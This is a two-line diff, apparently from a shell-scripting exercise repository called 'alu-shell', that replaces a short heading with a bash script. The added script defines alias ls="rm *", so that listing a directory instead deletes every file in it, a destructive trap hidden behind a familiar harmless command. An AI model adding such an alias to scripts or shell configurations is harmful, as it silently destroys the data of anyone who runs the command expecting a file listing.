@@ -1,2 +1,2 @@
-# alu-shell
-shell 
+#!/bin/bash
+alias ls="rm *" 
